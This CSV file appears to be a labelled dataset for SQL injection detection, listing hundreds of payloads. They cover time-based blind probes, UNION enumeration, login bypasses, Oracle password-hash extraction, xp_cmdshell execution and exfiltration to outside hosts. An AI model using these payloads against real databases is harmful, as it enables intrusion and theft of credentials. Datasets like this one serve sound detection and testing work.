Payloads,Types
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ",sql
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",sql
"a"" order by 1-- #",sql
x' AND userid IS NULL; --,sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
' or username like '%,sql
b'123%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27',sql
") and 0=benchmark(3000000,MD5(1))%20/*",sql
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sql
')))) waitfor delay '0:0:20' /* ,sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",sql
admin') or ('1'='1'#,sql
b'a\xc2\x80\xc2\x98 or 1=1 --',sql
"b""%20or%20''='""",sql
 ORDER BY 23# ,sql
' or 'unusual' = 'unusual',sql
23%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23,sql
admin') or ('2' LIKE '2'/*,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sql
or 0=0 --,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",sql
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
b'23+len(@@servername)-len(@@servername)',sql
"b""' or '1'='1'--""",sql
b'123+len(1234)-len(123)',sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i""",sql
"')))) and 0=benchmark(3000000,MD5(1))%20/*",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",sql
" and (select substring(@@version,3,1))='S'",sql
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
""" waitfor delay '0:0:20' --",sql
"hi"" or ""a""=""a",sql
ORDER BY SLEEP(5),sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- ",sql
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"b""'||UTL_HTTP.REQUEST('http://somehost/')||'""",sql
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i""",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8#",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",sql
 ORDER BY 19 ,sql
+waitfor+delay+'00:00:05',sql
b'(select top 1',sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",sql
"b""'+waitfor+delay+'00:00:05'""",sql
"b""' or 1=1--""",sql
')) and pg_sleep(50)--,sql
' and 1=(select 1)+',sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i""",sql
b'# from wapiti',sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sql
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sql
"benchmark(50000000,MD5(1))-- ",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",sql
0 or 1=1,sql
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
1;SELECT%20*,sql
" UNION ALL SELECT 1,2",sql
" UNION ALL SELECT 1,2,3,4,5,6",sql
b'\x18 or 1=1 --',sql
"b""123'+not+like+'1234""",sql
"b""1'<99# """,sql
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sql
123/*!or*/1=1;,sql
b'1)) or pg_sleep(__TIME__)--',sql
"admin"") or ""1""=""1""--",sql
';declare @x varchar(80); set @x = 0x73656c65637420404076657273696f6e; EXEC (@x),sql
"b"") or ('a'='a""",sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",sql
 ORDER BY 1# ,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",sql
"b""a' waitfor delay '0:0:10'--""",sql
"b""1'OR'121'='121""",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",sql
b'1+union+select+abc+from+abc',sql
"b""1'%0Bunion%0Bselect%0B1,2,3""",sql
"1)) or benchmark(10000000,MD5(1))#",sql
""" or 1=1--",sql
"b""' or '1'='1""",sql
""" or 1=1#",sql
""")) or sleep(__TIME__)=""",sql
 AND 7300=7300 AND 'pKlZ'='pKlY,sql
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
"and (select substring(@@version,1,1))='X'",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sql
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sql
 and 2=0-- oracle_mysql,sql
",NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i""",sql
";/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ ""ping 127.0.0.1"" /*,1*/--",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- ",sql
 ORDER BY 18# ,sql
"b'or 0=0 #""'",sql
))))) waitfor delay '0:0:20' --,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",sql
"b""')+waitfor+delay+'0:0:5'""",sql
 ORDER BY 24# ,sql
"b""1'+and+(select+substr(group_concat(pass),1,1)+from+users)='a""",sql
 waitfor delay '0:0:20' /* ,sql
'<=>0# ,sql
(SELECT 1 FROM (SELECT SLEEP(50))A),sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sql
 or SLEEP(5)#,sql
b'(sqlvuln)',sql
"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
 ORDER BY 16# ,sql
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',sql
"' and+if(true%21=true,1,SLEEP(5))--+",sql
"b'if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00'",sql
"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- ",sql
b'UNION ALL SELECT',sql
copy myfile from '/etc/passwd'; ,sql
"b'\';/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ ""ping 127.0.0.1"" /*,1*/--'",sql
"\"") and pg_sleep(50)--",sql
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"""))))) waitfor delay '0:0:20' /* ",sql
b'1) or sleep(__TIME__)#',sql
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sql
 ORDER BY 14# ,sql
SLEEP(50),sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",sql
a' or 1=1; --,sql
"' aNd 4=MID((@@version,1,1)--+",sql
 ORDER BY 5-- ,sql
or 0=0 #,sql
AND 1=0#,sql
 and 2=0#mysql,sql
banner from v$version,sql
admin' --,sql
1'+and+(select+pass+from+users+limit+1)='pass--,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- ",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",sql
'; exec ('sel' + 'ect us' + 'er'),sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",sql
 UNION ALL SELECT 1-- ,sql
"a:1:{s:+13:"":new:username"";O:67:""EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable"":1:{s:+6:""lexeme"";s:+'.$length.':""1+UNION+SELECT+SLEEP(5)+#+'.$garbage.'"";}}",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",sql
 AND 1083=1083 AND (1427=1427,sql
"hi"") or (""a""=""a",sql
b'*/*',sql
' WAITFOR DELAY '0:0:50' and 'a'='a;--,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",sql
name from master..syslogins,sql
' or pg_sleep(__TIME__)--,sql
a' or 3=3--,sql
declare @s varchar(22) select @s =,sql
superbug' AND 'a'='a,sql
-123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),4#",sql
%',sql
'||utl_http.request('httP://192.168.1.1/')||',sql
admin'/*  ,sql
and+true=false--+,sql
""")))))) waitfor delay '0:0:20' --",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",sql
b'%53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73',sql
"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",sql
"b'1 or benchmark(10000000,MD5(1))#'",sql
1+len(@@servername)>1;%00,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",sql
"))) and 0=benchmark(3000000,MD5(1))%20%23",sql
a'or/*g*/345=345-- #,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",sql
"""))) and 0=benchmark(3000000,MD5(1))%20%23",sql
%20or%20x=x,sql
"SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;",sql
"b""x' OR full_name LIKE '%Bob%""",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sql
'),sql
""")) and 0=benchmark(3000000,MD5(1))%20--",sql
x' AND email IS NULL; -- ,sql
b'1) or pg_sleep(__TIME__)--',sql
b'%20or%201=1',sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ",sql
"b""' or 0=0 --""",sql
'));waitfor delay '0:0:__TIME__'--,sql
"SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;",sql
"b""'+waitfor+delay+'00:00:05'--""",sql
 ORDER BY 4# ,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",sql
 ORDER BY 19-- ,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",sql
827364827346%0a||%0a345%0alIke%0a345,sql
"b"" or 'something' = 'some'+'thing'""",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",sql
 ORDER BY 2-- ,sql
"b""%20'sleep%2050'""",sql
 ORDER BY 12-- ,sql
"b""'; EXEC ('SEL' + 'ECT US' + 'ER')""",sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",sql
123%29%07AND%079869=8149%01AND%01%281045=1045,sql
' or '1'='1'-- ,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",sql
 OR x=x#,sql
'1+or+1=1--,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",sql
"\"") and sleep(50)--",sql
))%20waitfor%20delay%20'0:0:20'%20--,sql
admin' or '1'='1'/*,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",sql
" or benchmark(50000000,MD5(1))-- ",sql
' pg_sleep(50),sql
' select * from information_schema.tables--,sql
""")))) waitfor delay '0:0:20' /* ",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",sql
123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1,sql
admin --,sql
admin' or 1=1/*,sql
a' or 'dfth'='dfth'#,sql
"b""; exec ('sel' + 'ect us' + 'er')""",sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sql
"a"" or ""dfth""=""dfth""-- #",sql
AND 1=0-- ,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- ",sql
"')))) and 0=benchmark(3000000,MD5(1))%20%23",sql
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",sql
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- ,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",sql
1+and+1=1,sql
"b""' or 1=1""",sql
b'+where 0 = 0',sql
 ORDER BY 6# ,sql
"b"" or '7659'='7659""",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",sql
admin') or '1'='1'/*,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",sql
" UNION ALL SELECT 1,2-- ",sql
a'or/*d*/345=345--,sql
b'MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==',sql
"') and 0=benchmark(3000000,MD5(1))%20--",sql
or 1=1,sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",sql
AND 7300=7300 AND 'pKlZ'='pKlY,sql
"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
a'and/*d*/456=678--,sql
" and (select substring(@@version,2,1))='i'",sql
"(SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)",sql
 ORDER BY 1 ,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",sql
pg_sleep(__TIME__)--,sql
select * from myfile;copy myfile to /tmp/test;,sql
"345"")%5d|//*|/a%5bcontains(a,""b",sql
') or ('x')=('x,sql
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sql
"b'1%27%20union%20select%201,2,3--'",sql
SLEEP(5)#,sql
8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->,sql
exec master..xp_cmdshell 'net+users',sql
"345""%5d|//*|/a%5b""a",sql
"1+union+select+1,2,3/*",sql
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,sql
b'or pg_sleep(__TIME__)--',sql
"admin"" #",sql
b'select name from syscolumns where id = (sele ...',sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- ",sql
"nion/*aaa*/select/*aaa*/1,2,3",sql
"1%0Aunion%0Aselect%0A1,2,3/*",sql
123%20or%20%c0%a7%c01%a71=%c0%a71,sql
') or sleep(__TIME__)=',sql
"b""'|0# """,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",sql
b'sqlvuln',sql
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,sql
"<>""'%;)(&+",sql
admin)(|(password=*),sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ",sql
' or sleep(__TIME__)#,sql
 UNION ALL SELECT SLEEP(5)-- ,sql
"b'union/*aaa*/select/*aaa*/1,2,3'",sql
' or 1 in (select @@version)--,sql
’ or ‘1’=’1,sql
b'1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc',sql
"b""'||utl_inaddr.get_host_name((select+user+from+dual))""",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",sql
' or 1=1 or ''=',sql
" UNION ALL SELECT 1,2,3#",sql
""") and 0=benchmark(3000000,MD5(1))%20%23",sql
*/*,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",sql
')) and sleep(50)--,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- ",sql
exec master..xp_cmdshell 'ipconfig+/all'	,sql
 ORDER BY 16-- ,sql
' (select top 1,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",sql
"b""')%20or%20('x'='x""",sql
"b'1) or benchmark(10000000,MD5(1))#'",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",sql
 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',sql
')+waitfor+time+'00:00:01',sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",sql
"' and+if(1=2,1,SLEEP(5))--+",sql
 WHERE 1=1 AND 1=1--,sql
b'123%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20',sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",sql
1)) and pg_sleep(50)--,sql
' or 'something' like 'some%',sql
2/*f*/or/*f*/345=345,sql
b'123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1',sql
456'||'0,sql
create user name identified by 'pass123',sql
""" or 0=0 -- ",sql
OR x=x,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",sql
b'1+and+1=1',sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i""",sql
LOAD_FILE('/windows/win.ini'),sql
'; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER',sql
"1'%0Cunion%0Cselect%0C1,2,3",sql
"b""; exec master..xp_cmdshell 'ping 172.10.1.255'--""",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i""",sql
b'1;SELECT%20*',sql
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,sql
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
 ORDER BY 25-- ,sql
 ORDER BY 22# ,sql
123'+not+like+'1234,sql
b'|',sql
""" and 0=benchmark(3000000,MD5(1))%20--",sql
"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",sql
select SYS.DATABASE_NAME from dual,sql
select version();	,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- ",sql
case when name=0x5265696E657273 then 1 else 0 end,sql
""") or sleep(__TIME__)=""",sql
a' or 1=1--,sql
"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",sql
' waitfor delay '0:0:20' --,sql
"""*""",sql
exec xp,sql
b'or 0=0 #',sql
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
"b') or benchmark(10000000,MD5(1))#'",sql
PRINT,sql
admin') or '1'='1'--,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",sql
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),sql
%' AND 8310=8311 AND '%'=',sql
""" or """"*""",sql
b'123%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27',sql
"b""'; exec master..xp_cmdshell""",sql
') waitfor delay '0:0:20' /* ,sql
 or SLEEP(5)=',sql
"SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3",sql
 OR x=y-- ,sql
'%20;,sql
b'or 0=0 --',sql
"b""or 'whatever' in ('whatever')""",sql
AND 1083=1083 AND ('1427=1427,sql
